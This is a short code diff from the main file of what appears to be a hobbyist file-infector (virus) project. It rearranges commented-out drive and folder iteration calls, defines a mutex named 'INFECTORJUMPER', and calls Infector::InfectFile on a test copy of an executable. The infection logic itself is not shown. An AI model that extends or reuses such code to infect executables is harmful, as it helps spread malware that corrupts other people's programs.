@@ -21,15 +21,19 @@ void IterateFileFunction(const wchar_t* file)
 }
 */
 
+//FileSystem::Drives::IterateDrives(IterateDrivesFunction);
+
+//FileSystem::Files::IteratePath(L"C:\\Users\\Yoav\\Desktop\\Tools\\MyDevelopments\\CustomStd\\CustomStd", IterateFileFunction, IterateFolderFunction);
+
+
+#define IS_RUNNING_MUTEXT_NAME L"INFECTORJUMPER"
+
+
 int main()
 {
 
-
-    //FileSystem::Drives::IterateDrives(IterateDrivesFunction);
-
-    //FileSystem::Files::IteratePath(L"C:\\Users\\Yoav\\Desktop\\Tools\\MyDevelopments\\CustomStd\\CustomStd", IterateFileFunction, IterateFolderFunction);
-
     Infector::InfectFile(L"C:\\Users\\Yoav\\Desktop\\YoavTools\\FileInfector\\x64\\Release\\MessageBox - Copy.exe");
+
 
     return 0;
 
